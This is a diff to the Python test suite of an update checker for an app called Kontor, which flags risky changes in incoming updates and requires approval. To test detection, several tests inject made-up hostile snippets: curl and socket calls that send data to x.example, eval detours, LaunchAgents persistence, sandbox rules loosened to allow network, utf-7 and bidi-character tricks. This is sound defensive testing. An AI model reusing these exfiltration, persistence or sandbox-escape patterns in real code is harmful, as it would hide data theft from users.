@@ -2,6 +2,7 @@
 plainly written or hidden --, a change that does not is not; an update with findings waits and is installed only with an
 approval for exactly its files, from an archive and in a git clone. All with made-up code; nothing is fetched."""
 import io
+import json
 import os
 import re
 import shutil
@@ -686,12 +687,12 @@ class Program(unittest.TestCase):
                "at the Mac: any address": (("rule",), "auth.py", "is_loopback"), "updates from another repository by default": (("address",), "core.py", "x/Kontor"),
                "llama.cpp from another repository": (("rule", "address"), "llm_local.py", "x/llama.cpp")})
         check({"service_py": lambda b: b.replace(b"return self._update_install(body, s)", b"return self._update_install(dict(body, approved=((app.update_info or {}).get('review') or {}).get('digest')), s)"),
-               "web__app_js": lambda b: b.replace(b"const f = upFinds(info); if (!f.length) return '';", b"return '';"),
+               "web__app_js": lambda b: b.replace(b"if (!f.length && !plain.length) return '';", b"return '';"),
                "llm_local_py": lambda b: b.replace(b'"repo": "unsloth/Qwen3.5-9B-GGUF"', b'"repo": "x/Qwen3.5-9B-GGUF"')},
               {"the approval made up on the way": (own, "service.py", "_route"), "the findings no longer shown": (("rule",), "web/app.js", "upReview"),
                "a model from another repository": (("address",), "llm_local.py", "x/Qwen3.5-9B-GGUF")})
         check({"service_py": lambda b: b.replace(b'return auth.is_loopback(s.get("remote", "")) and self._loopback()', b"return True"),
-               "web__app_js": lambda b: b.replace(b"guard: 'upd_k_guard', ", b""),
+               "web__app_js": lambda b: b.replace(b"guard: ['upd_t_check', 'upd_w_check'], ", b""),
                "llm_local_py": lambda b: b.replace(b'        if not SHA_RE.fullmatch(sha256 or ""):             # nothing is installed or run that cannot be checked\n            raise ValueError(tr("s_ki_keine_pruefsumme"))\n', b"")},
               {"at the Mac: the service's own check": (("rule",), "service.py", "_is_local"), "a kind of finding hidden": (("rule",), "web/app.js", "UP_KINDS"),
                "loaded without a SHA-256": (("rule",), "llm_local.py", "_fetch")})
@@ -709,13 +710,84 @@ class Program(unittest.TestCase):
                                     .replace(b'"pick": ["Q4_K_M", "UD-Q4_K_XL"], "gb": 6', b'"pick": ["UD-Q4_K_XL", "Q4_K_M"], "gb": 6', 1),
                                     **{"mm_bridge.jxa": lambda b: b + b"\n// nothing else\n", "mac_app_swift": lambda b: b.replace(b"// mac_app.swift --", b"// mac_app.swift (the app) --", 1)}), [])
 
+    def judged(self, **files):
+        """Kontor's program changed (name__sub or a path with "/"), judged against itself as it is: what compare gives."""
+        new = changed(self.files, **{k: v for k, v in files.items() if "/" not in k})
+        new.update({k: (v(self.files.get(k, b"")) if callable(v) else v) for k, v in files.items() if "/" in k})
+        scanned = G.scan(new, set(self.files))
+        return G.judge(G._differences(self.scan[0], scanned, set(new)), self.files, new, self.scan, scanned)
+
+    def test_a_major_version_asks_only_what_can_be_a_risk(self):
+        """Like the update 3.16.100 -> 3.17.0 (made up on Kontor as it is; the real one: ReleasedVersions): stricter filters and
+        sandbox rules, the check rebuilt, a helper and two calls that go out changed. What asks: the check (one entry for
+        all of it, however much changed in it), the helper, one entry per way out whose call changed and one for the filter
+        of the internet search (in a chat you allowed, searches go without a click) -- the rest is one quiet line."""
+        def swap(old, new):
+            def change(b):
+                self.assertEqual(b.count(old), 1, old)
+                return b.replace(old, new)
+            return change
+        found = self.judged(
+            web_search_py=lambda b: swap(b"_PLAIN_LEAST = 6 ", b"_PLAIN_LEAST = 5 ")(swap(b'GENERIC = {"bank", ', b'GENERIC = {"mustermann", "bank", ')(
+                swap(b'_PERCENT = re.compile(r"%[0-9A-Fa-f]{2}")', b'_PERCENT = re.compile(r"%[0-9A-Fa-f]{1,2}")')(
+                    swap(b'             "(deny file-write*)",', b'             "(deny file-write*)", "(deny iokit-open)",')(b)))),
+            receipt_text_py=swap(b'        "(deny file-write*)",', b'        "(deny file-write*)", "(deny iokit-open)",'),
+            update_guard_py=lambda b: swap(b'HARMLESS = frozenset("""__future__ abc ', b'HARMLESS = frozenset("""__future__ socket abc ')(b)
+            + b"\n\ndef _later():\n    import subprocess\n    return subprocess.run(['git', 'log', 'https://example.org/x'])\n",
+            updates_py=swap(b"MAX_TREE = 512 * 1024 * 1024 ", b"MAX_TREE = 256 * 1024 * 1024 "),
+            auth_py=swap(b'"--args", reason, nonce], capture_output=True, timeout=95)', b'"--args", reason, nonce], capture_output=True, timeout=99)'),
+            llm_local_py=swap(b'TMP_PREFIX = "llm-run-" ', b'TMP_PREFIX = "llm-tmp-" '),
+            mac_app_swift=swap(b"private static let rowEnd: CGFloat = 46", b"private static let rowEnd: CGFloat = 48"))
+        asks = entries(found)
+        self.assertEqual(sorted(asks), ["check", "filter", "script:mac_app.swift", "way_program:llm_local.py", "way_program:open"], list(asks))
+        self.assertEqual({x["level"] for x in asks["check"] + asks["script:mac_app.swift"]}, {"critical"})
+        self.assertEqual({x["level"] for x in asks["way_program:open"] + asks["way_program:llm_local.py"] + asks["filter"]}, {"review"})
+        self.assertEqual({x["where"] for x in asks["filter"]}, {"_PLAIN_LEAST", "GENERIC", "_PERCENT"})
+        self.assertEqual(sorted({x["file"] for x in asks["check"]}), ["update_guard.py", "updates.py"])
+        self.assertEqual({x["kind"] for x in asks["check"]}, {"guard"})                  # (what else the check holds: in its lines)
+        self.assertTrue(any("socket" in x for f in asks["check"] for x in f.get("lines", [])))
+        plain = {(f["file"], f["where"]) for f in found if f["level"] == "plain" and not f.get("dup")}
+        self.assertTrue({("web_search.py", "reader_profile()"), ("receipt_text.py", "_profile()")} <= plain, plain)
+        self.assertLess(len(json.dumps(found)), 64 * 1024)
+        # and an update with only what is plain is installed without a word
+        self.assertEqual(G.asking(self.judged(web_search_py=swap(b'             "(deny file-write*)",', b'             "(deny file-write*)", "(deny iokit-open)",'),
+                                              receipt_text_py=swap(b'        "(deny file-write*)",', b'        "(deny file-write*)", "(deny iokit-open)",'))), [])
+
     def test_every_kind_is_shown(self):
-        """Each kind of finding has its line on the update page, in both languages; the page's rules are there."""
+        """Each kind of finding and each entry the check can name has its title and explanation on the update page, in both
+        languages (a finding Kontor did not judge is titled by its kind); the page's rules are there."""
         app, texts = self.files["web/app.js"].decode("utf-8"), self.files["web/i18n.js"].decode("utf-8")
+        cat = json.loads(texts[texts.index("{"):texts.rindex("}") + 1])
         kinds_on_page = re.search(r"const UP_KINDS = \{([^}]*)\}", app).group(1)
+        keys = []
         for kind in G.KINDS:
-            self.assertIn("%s: 'upd_k_%s'" % (kind, kind), kinds_on_page, kind)
-            self.assertRegex(texts, r'"upd_k_%s":\["[^"]+", "[^"]+"\]' % kind)
+            m = re.search(r"\b%s: \['(upd_t_\w+)', '(upd_w_\w+)'\]" % kind, kinds_on_page)
+            self.assertTrue(m, kind)
+            keys += [m.group(1), m.group(2)]
+        keys += [k for pair in G.TOPIC_TEXT.values() for k in pair]
+        for key in keys:
+            self.assertIn(key, cat, key)
+            de, en = cat[key]
+            self.assertEqual(de.count("{0}"), en.count("{0}"), key)
+        for topic in set(G.TOPIC_ORDER) | G.RULE_TOPICS:
+            self.assertIn(topic, G.TOPIC_TEXT, topic)
+        # every name of the rules, the page's rules and the words is judged, each by a policy the check knows
+        for table in (G.RULES, G.PAGE_RULES):
+            for rel, names in table.items():
+                for name in names:
+                    self.assertIn(name, G.RULE_LEVEL.get(rel, {}), "%s: %s has no level" % (rel, name))
+        for rel in G.WORDS:
+            self.assertIn(rel, G.RULES)
+        self.assertEqual({p for v in G.RULE_LEVEL.values() for _t, p in v.values()} - {"risk", "card", "allow", "deny", "shield"}, set())
+        # a table judged by its entries is written out in the program (else it is never plain)
+        import ast
+        for rel, names in G.RULE_LEVEL.items():
+            for name, (_topic, policy) in names.items():
+                if policy in ("allow", "deny"):
+                    value = G._tops(ast.parse(self.files[rel].decode("utf-8")), name)
+                    self.assertIsNotNone(value, name); G._literal(value)
+                elif policy == "shield":
+                    self.assertEqual(len(G._defs(ast.parse(self.files[rel].decode("utf-8")), name)), 1, name)
         for rel, names in G.PAGE_RULES.items():
             self.assertEqual(sorted(G._page_rules(rel, self.files[rel].decode("utf-8"))), sorted(names), rel)
         self.assertEqual(sorted(k[2] for k in self.scan[0] if k[0] == "rule" and k[1] == "web/app.js"), sorted(G.PAGE_RULES["web/app.js"]))
@@ -729,6 +801,239 @@ class Program(unittest.TestCase):
                 ("what the assistant may be asked", {"assistant_py": b"\n\ndef more(x):\n    return [x]\n"})):
             with self.subTest(name):
                 self.assertEqual(self.found(**files), [], name)
+
+
+def entries(found) -> dict:
+    """The entries of the update page that need approval: {topic: [findings]}, in their order."""
+    out: dict = {}
+    for f in G.asking(found):
+        out.setdefault(f.get("topic") or f["kind"], []).append(f)
+    return out
+
+
+class Judged(unittest.TestCase):
+    """What each finding means: what slips something in stays critical, what changes an existing way out is to be reviewed
+    (one entry per way), what is only stricter or behind a card in the chat is plain -- installed without asking. Each with an
+    explanation and the lines it concerns."""
+
+    def found(self, **files):
+        return G.compare(SMALL, changed(**files))
+
+    def one(self, rel, change):
+        """A file of Kontor alone, changed (its rules are kept per file: quick)."""
+        with open(os.path.join(ROOT, rel), "rb") as f:
+            old = f.read()
+        new = change(old)
+        self.assertNotEqual(new, old, rel)                        # (the place is there: the change is really made)
+        return G.compare({rel: old}, {rel: new})
+
+    def levels(self, found) -> set:
+        return {f["level"] for f in found}
+
+    def test_slipped_in_stays_critical(self):
+        for name, files, topic in (
+                ("a new host", {"work_py": b"\nWHERE = 'https://x.example/in'\n"}, "address:x.example"),
+                ("a new host on a page", {"web__app_js": b"\nconst more = 'https://x.example/a';\n"}, "address:x.example"),
+                ("subprocess in a new function", {"work_py": b"\nimport subprocess\n\n\ndef send(d):\n    subprocess.run(['curl', '-d', d, 'x.example'])\n"}, "new_program:curl"),
+                ("the open starter of programs used from elsewhere", {"work_py": b"\nimport tools\n\n\ndef send(d):\n    tools.run('/usr/bin/curl', '-d', d, 'x')\n"}, "new_"),
+                ("a new connection", {"work_py": b"\nimport socket\n\n\ndef send(d):\n    socket.create_connection(('x.example', 443)).send(d)\n"}, "module:socket"),
+                ("a .pth file", {"evil.pth": b"import os\n"}, "shadow:evil.pth"),
+                ("the installer changed", {"updates_py": b"\nX = 1\n"}, "check"),
+                ("the check: a harmless part more", {"update_guard_py": lambda b: b.replace(b"('json',)", b"('json', 'socket')")}, "check"),
+                ("a detour", {"work_py": b"\n\ndef send(t):\n    return eval(t)\n"}, "detour:work.py"),
+                ("writing into its own files", {"work_py": b"\n\ndef grow(t):\n    with open(os.path.join(os.path.dirname(__file__), 'fetch.py'), 'a') as f:\n        f.write(t)\n"}, "self:work.py"),
+                ("a helper changed", {"helper_swift": b"let p = Process()\n"}, "script:helper.swift"),
+                ("a file that cannot be read", {"fast_pyc": b"\x00\x01"}, "file:fast.pyc"),
+                ("a start entry of macOS", {"work_py": b"\n\ndef send():\n    save(os.path.expanduser('~/Library/LaunchAgents/x.plist'), 1)\n"}, "place:LaunchAgents"),
+                ("a page that leaves", {"web__app_js": b"\nfunction send(d) { location.href = u + d; }\n"}, "page:web/app.js")):
+            with self.subTest(name):
+                found = self.found(**files)
+                asks = entries(found)
+                self.assertTrue(any(t.startswith(topic) for t in asks), (name, list(asks)))
+                for t, xs in asks.items():
+                    if t.startswith(topic):
+                        self.assertEqual({x["level"] for x in xs}, {"critical"}, name)
+                        self.assertTrue(all(x["title"].startswith("upd_t_") and x["why"].startswith("upd_w_") for x in xs), name)
+
+    def test_data_mixed_into_a_request_is_to_be_reviewed(self):
+        """What goes out over a way there is already, put together differently: asked about, as one entry for that way --
+        with the lines that changed (taken away and new)."""
+        mixed = {"fetch_py": lambda b: b.replace(b"return urllib.request.urlopen(url, timeout=5).read()",
+                                                 b"return urllib.request.urlopen(url + '?d=' + extra(), timeout=5).read()")
+                 + b"\n\ndef extra():\n    return open('/tmp/x').read()\n"}
+        found = self.found(**mixed)
+        asks = entries(found)
+        self.assertEqual(len(asks), 1, asks); xs = list(asks.values())[0]
+        self.assertEqual({x["level"] for x in xs}, {"review"}); self.assertEqual({x["kind"] for x in xs}, {"call", "around"})
+        call = [x for x in xs if x["kind"] == "call"][0]
+        self.assertTrue(any(x.startswith("-") and "urlopen(url, timeout=5)" in x for x in call["lines"]), call["lines"])
+        self.assertTrue(any(x.startswith("+") and "extra()" in x for x in call["lines"]), call["lines"])
+        self.assertEqual(call["where"], "get"); self.assertEqual(call["file"], "fetch.py")
+        around = [x for x in xs if x["kind"] == "around"][0]
+        self.assertTrue(all(x.startswith("+") for x in around["lines"]), around)          # new: all its lines are new
+        # the same call, new: a new way out -- critical
+        new = self.found(work_py=b"\nimport urllib.request\n\n\ndef send(d):\n    return urllib.request.urlopen('https://api.example.org/v?d=' + d)\n")
+        self.assertIn("critical", {x["level"] for x in G.asking(new) if x["kind"] == "call"})
+
+    def test_sandbox_rules(self):
+        """A profile of macOS' sandbox: a rule more that denies or one less that allows is stricter (plain); a rule more that
+        allows, one less that denies, rules moved, a rule that is not one plain whole rule, or anything else of the function
+        changed is critical."""
+        llm = "llm_local.py"
+        stricter = (("a rule more that denies", lambda b: b.replace(b'"(deny appleevent-send)", "(deny lsopen)",', b'"(deny appleevent-send)", "(deny lsopen)", "(deny iokit-open)",')),
+                    ("a rule less that allows", lambda b: b.replace(b', "(allow file-read-metadata (vnode-type DIRECTORY))"])', b"])")),
+                    ("a rule more with a pattern", lambda b: b.replace(b'"(deny signal)",', b'"(deny signal)", \'(deny file-write* (regex #"^/private/x/(a|b)"))\',')),
+                    ("only its explanation", lambda b: b.replace(b'    """The rules for sandbox-exec (later rules win).', b'    """The rules for sandbox-exec (the last rule wins).')))
+        for name, change in stricter:
+            with self.subTest(name):
+                found = self.one(llm, change)
+                self.assertEqual(G.asking(found), [], (name, found))
+                if name != "only its explanation":
+                    self.assertIn("plain", self.levels(found)); self.assertIn("model_shield", {f["topic"] for f in found})
+        looser = (("network allowed", lambda b: b.replace(b'"(deny network*)",', b'"(allow network*)",')),
+                  ("a rule less that denies", lambda b: b.replace(b'"(deny appleevent-send)", ', b"")),
+                  ("a rule more that allows", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", "(allow lsopen)",')),
+                  ("a rule that denies and allows", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", "(deny iokit-open) (allow network*)",')),
+                  ("a rule that hides the ones after it", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen) #|",')),
+                  # the sandbox's language runs every part of a rule: a "deny" that defines or holds an allow is no plain rule
+                  ("a rule that denies but redefines deny", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", \'(deny file-read-data (begin (define deny allow) (literal "/x")))\',')),
+                  ("a rule that denies, an allow inside", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", "(deny file-read* ( allow default))",')),
+                  ("a rule that denies with a modifier", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", "(deny file-read* (with no-report))",')),
+                  # a second function of the same name, hidden from splitlines behind form feeds in comments: Python runs it
+                  ("a second profile behind a form feed", lambda b: b + b'\n# \x0c_x = """\ndef sandbox_profile(*a, **k):\n    return "(version 1)\\n(allow default)\\n"\n# \x0c"""\n'),
+                  ("a rule that denies, put together from values", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", "(deny file-read* (subpath %s))" % q("/x"),')),
+                  ("rules moved", lambda b: b.replace(b'"(deny signal)", "(allow signal (target self))",', b'"(allow signal (target self))", "(deny signal)",')),
+                  ("a rule more, and the strict level for another", lambda b: b.replace(b'"(deny lsopen)",', b'"(deny lsopen)", "(deny iokit-open)",').replace(b'    if level == "strict":\n        rules +=', b'    if level == "x":\n        rules +=')))
+        for name, change in looser:
+            with self.subTest(name):
+                found = self.one(llm, change)
+                shield = [f for f in G.asking(found) if f["topic"] == "model_shield"]
+                self.assertTrue(shield, (name, found)); self.assertEqual({f["level"] for f in shield}, {"critical"}, name)
+                self.assertEqual(shield[0]["title"], "upd_t_model_shield")
+                self.assertTrue(any(x[:1] in "+-" for f in shield for x in f.get("lines", [])), shield)
+        # the receipt reader's profile is judged the same way, and the internet search's reader's
+        for rel, old, new, plain in (("receipt_text.py", b'"(deny file-write*)",', b'"(deny file-write*)", "(deny iokit-open)",', True),
+                                     ("receipt_text.py", b'"(deny file-write*)",', b'"(deny file-write*)", "(allow network-outbound)",', False),
+                                     ("web_search.py", b'"(deny file-write*)",', b'"(deny file-write*)", "(deny iokit-open)",', True),
+                                     ("web_search.py", b'"(deny file-write*)",', b'"(allow file-write*)",', False)):
+            with self.subTest(rel + (" stricter" if plain else " looser")):
+                found = self.one(rel, lambda b: b.replace(old, new, 1))
+                self.assertEqual(G.asking(found) == [], plain, found)
+
+    def test_stricter_rules_and_rules_behind_a_card(self):
+        """The internet search: a longer list of what is kept apart and a shorter list of what may be reached are plain; its
+        filter against your own data is one entry to review either way (stricter or softer cannot be proven, and in a chat
+        you allowed searches go without a click); more that may be reached, less kept apart, what goes without a card and what
+        the reader sends unseen are critical."""
+        ws = "web_search.py"
+        plain = (("a longer list of shared domains", lambda b: b.replace(b'SHARED = {"github.io", ', b'SHARED = {"github.io", "example.net", ')),
+                 ("a source less", lambda b: b.replace(b'    "wikidata": {"tier": 1, "hosts": ("www.wikidata.org",)},\n', b"")))
+        for name, change in plain:
+            with self.subTest(name):
+                found = self.one(ws, change)
+                self.assertTrue(found, name); self.assertEqual(G.asking(found), [], (name, found))
+        review = (("a stricter filter", lambda b: b.replace(b"_PLAIN_LEAST = 6 ", b"_PLAIN_LEAST = 5 ")),
+                  ("one more word that names nothing", lambda b: b.replace(b'GENERIC = {"bank", ', b'GENERIC = {"mustermann", "bank", ')),
+                  ("the filter softened", lambda b: b.replace(b'            return "it contains an IBAN"\n', b"            pass\n")))
+        for name, change in review:
+            with self.subTest(name):
+                found = G.asking(self.one(ws, change))
+                self.assertTrue(found, name)
+                self.assertEqual({(f["topic"], f["level"]) for f in found}, {("filter", "review")}, name)
+                self.assertTrue(all(f.get("lines") for f in found), name)
+        critical = (("a shorter list of shared domains", lambda b: b.replace(b'SHARED = {"github.io", ', b"SHARED = {"), "trust"),
+                    ("a host more for a source", lambda b: b.replace(b'"hosts": ("www.wikidata.org",)}', b'"hosts": ("www.wikidata.org", "x.example")}'), "reader"),
+                    ("a source of another tier", lambda b: b.replace(b'"wikidata": {"tier": 1,', b'"wikidata": {"tier": 3,'), "reader"),
+                    ("any website trusted", lambda b: b.replace(b'    return bool(h) and any(h == x or h.endswith("." + x) for x in sites)', b"    return True"), "trust"),
+                    ("a name for Kontor in every request", lambda b: b.replace(b'NEUTRAL_AGENT = "Mozilla/5.0 (compatible)"', b'NEUTRAL_AGENT = "Kontor"'), "reader"))
+        for name, change, topic in critical:
+            with self.subTest(name):
+                found = [f for f in G.asking(self.one(ws, change)) if f["topic"] == topic]
+                self.assertTrue(found, name); self.assertEqual({f["level"] for f in found}, {"critical"}, name)
+
+    def test_a_table_changed_after_its_line(self):
+        """A table proven only stricter must not change anywhere else: an entry set after its line, its type (run when the file
+        loads), a line at the top that empties it or hands it on -- each asked about, and what it shows is the line itself."""
+        ws = "web_search.py"
+        at = b"\n\ndef _ace("
+        for name, change, topic in (
+                ("an entry set after the table", lambda b: b.replace(at, b'\nSOURCES["wikidata"] = {"tier": 1, "hosts": ("www.wikidata.org", "x.example")}' + at, 1), "reader"),
+                ("a type that empties another table", lambda b: b.replace(b"_SECOND = {", b"_SECOND: SHARED.clear() or set = {", 1), "trust"),
+                ("a line that empties the table", lambda b: b.replace(at, b"\nSHARED.clear()" + at, 1), "trust"),
+                ("the table handed on", lambda b: b.replace(at, b"\n_S = SHARED" + at, 1), "trust")):
+            with self.subTest(name):
+                found = [f for f in G.asking(self.one(ws, change)) if f["topic"] == topic]
+                self.assertTrue(found, name); self.assertEqual({f["level"] for f in found}, {"critical"}, name)
+        lines = [x for f in G.asking(self.one(ws, lambda b: b.replace(at, b"\nSHARED.clear()" + at, 1))) for x in f.get("lines", [])]
+        self.assertIn("+SHARED.clear()", lines)
+
+    def two(self, changes):
+        """Several files of Kontor, changed together."""
+        old, new = {}, {}
+        for rel, change in changes.items():
+            with open(os.path.join(ROOT, rel), "rb") as f:
+                old[rel] = f.read()
+            new[rel] = change(old[rel])
+            self.assertNotEqual(new[rel], old[rel], rel)
+        return G.compare(old, new)
+
+    def test_what_changes_a_rule_from_elsewhere(self):
+        """A rule changed not where it is written: in a function, in a class or a default value run at import, through the
+        file itself imported, from another file by the module or a name imported, through __dict__ -- each a finding that
+        asks; and a file that says it is written in another encoding (utf-7 hides code in what reads as a comment) cannot be
+        read here: asked about, too."""
+        ws, at = "web_search.py", b"\n\ndef _ace("
+        strip = b"def _strip(s: Any, n: int = SNIPPET) -> str:\n"
+        for name, changes in (
+                ("cleared in a function", {ws: lambda b: b.replace(strip, strip + b"    SHARED.clear()\n", 1)}),
+                ("a host added in a function", {ws: lambda b: b.replace(strip, strip + b'    SOURCES["wikipedia"]["hosts"] += ("x.example",)\n', 1)}),
+                ("cleared in a class at import", {ws: lambda b: b.replace(at, b"\nclass _C:\n    SHARED.clear()\n" + at, 1)}),
+                ("cleared through the file itself", {ws: lambda b: b.replace(at, b"\nimport web_search as _me\n_me.SHARED.clear()\n" + at, 1)}),
+                ("cleared from another file", {"assistant.py": lambda b: b.replace(b"\nimport web_search", b"\nimport web_search\nweb_search.SHARED.clear()", 1)}),
+                ("cleared through a name imported", {"assistant.py": lambda b: b.replace(b"\nimport web_search", b"\nimport web_search\nfrom web_search import SHARED as _S\n_S.clear()", 1)}),
+                ("a host added from another file", {"assistant.py": lambda b: b.replace(b"\nimport web_search", b'\nimport web_search\nweb_search.SOURCES["wikipedia"]["hosts"] += ("x.example",)', 1)}),
+                ("a profile replaced through __dict__", {"core.py": lambda b: b + b'\n\ndef _put(m, v):\n    m.__dict__["sandbox_profile"] = v\n'}),
+                ("a stricter table, emptied elsewhere", {ws: lambda b: b.replace(b'SHARED = {"github.io", ', b'SHARED = {"github.io", "x.example", ', 1),
+                                                         "assistant.py": lambda b: b.replace(b"\nimport web_search", b"\nimport web_search\nweb_search.SHARED.clear()", 1)}),
+                ("built-in names redefined", {ws: lambda b: b.replace(b'SHARED = {"github.io", ', b'def frozenset(*a):\n    return set()\n\n\nSHARED = frozenset({"github.io", ', 1)
+                                              .replace(b'"medium.com"}\n', b'"medium.com"})\n', 1)}),
+                ("another encoding", {"access.py": lambda b: b"# -*- coding: utf-7 -*-\n" + b}),
+                ("another encoding, second line", {"access.py": lambda b: b"#!/usr/bin/env python3\n# vim: set fileencoding=utf-7 :\n" + b})):
+            with self.subTest(name):
+                found = G.asking(self.two(changes))
+                self.assertTrue(found, name)
+                self.assertIn("critical", {f["level"] for f in found}, (name, found))
+
+    def test_sandbox_texts_with_an_escaped_quote(self):
+        """How the sandbox reads a quote after a backslash in #"..." cannot be told here: such a rule is never whole."""
+        self.assertFalse(G._sb_whole('(deny file-read-data (literal #"A\\"))(begin (allow network-outbound)(define x\\"B"))'))
+        self.assertFalse(G._sb_whole('(deny file-read-data (literal "a\\"b"))'))
+        self.assertTrue(G._sb_whole('(deny file-write* (regex #"^/private/x/(a|b)"))'))
+        self.assertTrue(G._sb_whole('(deny network-outbound (remote ip "localhost:*"))'))
+        self.assertFalse(G._sb_whole("(deny file-read* (with no-report))"))
+
+    def test_hidden_characters_are_shown(self):
+        """Characters that turn a line around or hide in it (right-to-left marks, zero widths, form feeds) are shown by their
+        number in the lines, never as they are."""
+        found = self.found(work_py=b"\nimport urllib.request\n\n\ndef send(d):\n    return urllib.request.urlopen('https://api.example.org/?d=' + d)  # \xe2\x80\xae\xe2\x81\xa6 ok\n")
+        lines = [x for f in found for x in f.get("lines", [])]
+        self.assertTrue(any("\u27e8U+202E\u27e9" in x for x in lines), lines)
+        self.assertFalse(any(c in x for x in lines for c in "\u202e\u2066\x0c"), lines)
+        for c in "\u061c\u00ad\u3164\ufe0f\U000e0041\u180e":
+            self.assertTrue(G._hidden(c), repr(c))
+        self.assertFalse(any(G._hidden(c) for c in "aä€ \t→"))
+
+    def test_lines_are_short_and_few(self):
+        """The lines go with the settings: each finding at most LINES_MOST, each line at most LINE_WIDTH, all together at
+        most LINES_ALL -- the rest is counted, not shown."""
+        big = b"\nimport subprocess\n" + b"".join(b"\n\ndef send%d(d):\n%s    subprocess.run(['curl', d])\n" % (i, b"    x = 1\n" * 40) for i in range(30))
+        found = self.found(work_py=big)
+        shown = [x for f in found for x in f.get("lines", [])]
+        self.assertLessEqual(len(shown), G.LINES_ALL); self.assertTrue(all(len(x) <= G.LINE_WIDTH for x in shown))
+        self.assertTrue(all(len(f.get("lines", [])) <= G.LINES_MOST for f in found))
+        self.assertTrue(any(f.get("more") for f in found))
+        long = self.found(work_py=b"\n\ndef send(d):\n    return os.system('%s' + d)\n" % (b"x" * 400))
+        self.assertTrue(all(len(x) <= G.LINE_WIDTH for f in long for x in f.get("lines", [])))
 
 
 def archive(files: dict, base: str = "Kontor-main") -> bytes:
@@ -791,6 +1096,28 @@ class Install(unittest.TestCase):
         self.assertTrue(done["ok"], done); self.assertEqual(self.read("work.py"), new["work.py"]); self.assertEqual(self.read("VERSION"), b"1.0.1\n")
         # and the version after it, without anything new, needs no approval
         self.assertTrue(self.install(changed(new, VERSION=lambda b: b"1.0.2\n"))["ok"])
+
+    def test_only_what_is_plain_installs_without_asking(self):
+        """An update whose findings are all plain (here: a table of the hosts that may be reached, judged by its entries) is
+        installed as ever -- the settings name it in one quiet line; one more host waits for your approval."""
+        keep = (G.RULES, G.RULE_LEVEL)
+        G.RULES = dict(G.RULES, **{"fetch.py": ("ALLOWED",)})
+        G.RULE_LEVEL = dict(G.RULE_LEVEL, **{"fetch.py": {"ALLOWED": ("reader", "allow")}})
+        try:
+            fewer = changed(fetch_py=lambda b: b.replace(b"ALLOWED = ('api.example.org',)", b"ALLOWED = ()"), VERSION=lambda b: b"1.0.1\n")
+            updates._get = lambda url, accept="": b"1.0.1\n" if url.endswith("/VERSION") else b"" if url.endswith(".md") else archive(fewer)
+            info = updates.check("x/y")
+            self.assertTrue(info["review"]["findings"]); self.assertEqual(G.asking(info["review"]["findings"]), [])
+            self.assertEqual({f["level"] for f in info["review"]["findings"]}, {"plain"})
+            res = self.install(fewer)
+            self.assertTrue(res["ok"], res); self.assertEqual(self.read("fetch.py"), fewer["fetch.py"])
+            more = changed(fewer, fetch_py=lambda b: b.replace(b"ALLOWED = ()", b"ALLOWED = ('api.example.org', 'x.example')"), VERSION=lambda b: b"1.0.2\n")
+            res = self.install(more)
+            self.assertTrue(res.get("needs_approval"), res); self.assertEqual(self.read("fetch.py"), fewer["fetch.py"])
+            self.assertIn("critical", {f["level"] for f in res["review"]["findings"]})
+            self.assertTrue(self.install(more, approved=res["review"]["digest"])["ok"])
+        finally:
+            G.RULES, G.RULE_LEVEL = keep
 
     def test_only_what_was_read_is_installed(self):
         """What the archive holds beside the program -- other folders, hidden files, the tests -- never reaches the program
@@ -1018,6 +1345,37 @@ class InstallInAClone(unittest.TestCase):
         self.assertTrue(done["ok"], done); self.assertEqual(self.head(), sha)
 
 
+def _commit(rev: str) -> bool:
+    return bool(shutil.which("git")) and subprocess.run(["git", "-C", ROOT, "cat-file", "-e", rev + "^{commit}"], capture_output=True).returncode == 0
+
+
+def _files_at(rev: str) -> dict:
+    """Kontor's program files as they were in a commit (as an update installs them)."""
+    names = subprocess.run(["git", "-C", ROOT, "ls-tree", "-r", "--name-only", rev], capture_output=True, text=True, check=True).stdout.splitlines()
+    return {n: subprocess.run(["git", "-C", ROOT, "show", "%s:%s" % (rev, n)], capture_output=True, check=True).stdout for n in names if G.installable(n)}
+
+
+@unittest.skipUnless(_commit("ca5b0ba") and _commit("39f7591"), "the history before 3.17.0 is not here (GitHub checks out the newest commit only)")
+class ReleasedVersions(unittest.TestCase):
+    """The update 3.16.100 -> 3.17.0 as it was: 121 findings, each asked about before. Now: the check, the shields that
+    changed in a way that is not only stricter, the internet search's address checks, a new program started, a place
+    named, the three helpers -- and one entry per way out whose calls changed, one for the internet search's filter; the
+    sandbox rules that only got stricter are one quiet line. (Without the history -- GitHub's test runs -- the same in
+    small: Program.test_a_major_version_asks_only_what_can_be_a_risk.)"""
+
+    def test_3_16_100_to_3_17_0(self):
+        found = G.compare(_files_at("ca5b0ba"), _files_at("39f7591"), limit=5000)
+        asks = entries(found)
+        self.assertLessEqual(len(asks), 16, list(asks))
+        crit = {t for t, xs in asks.items() if any(x["level"] == "critical" for x in xs)}
+        self.assertTrue({"check", "model_shield", "reader", "new_program:launchctl", "script:mac_app.swift", "script:mm_bridge.jxa", "script:touchid.swift"} <= crit, crit)
+        self.assertTrue(all(x["level"] == "review" for t, xs in asks.items() if t.startswith("way_") or t == "filter" for x in xs))
+        self.assertTrue({"privacy_problem()", "_LETTERS"} <= {x["where"] for x in asks["filter"]}, asks["filter"])
+        plain = {(f["file"], f["where"]) for f in found if f["level"] == "plain"}
+        self.assertTrue({("web_search.py", "reader_profile()"), ("receipt_text.py", "_profile()")} <= plain, plain)
+        self.assertLess(len(json.dumps(found)), 64 * 1024)
+
+
 class Settings(unittest.TestCase):
     """Einstellungen -> Updates in the browser: an update without findings looks as ever; one with findings is marked in the
     menu, shows what was found, and is installed with an approval for exactly the files shown."""
@@ -1051,10 +1409,17 @@ class Settings(unittest.TestCase):
                 "review": {"digest": "d" * 64, "findings": findings}}
 
     def test_marked_shown_and_approved(self):
-        finds = [{"kind": "module", "file": "work.py", "what": "import socket", "new": True},
-                 {"kind": "call", "file": "work.py", "what": "send: socket.create_connection(('x.example', 443))", "new": True},
-                 {"kind": "call", "file": "tools.py", "what": "show: subprocess.run(['open', path])", "new": False},
-                 {"kind": "address", "file": "web/app.js", "what": "https://x.example/<b>a</b>", "new": True}]
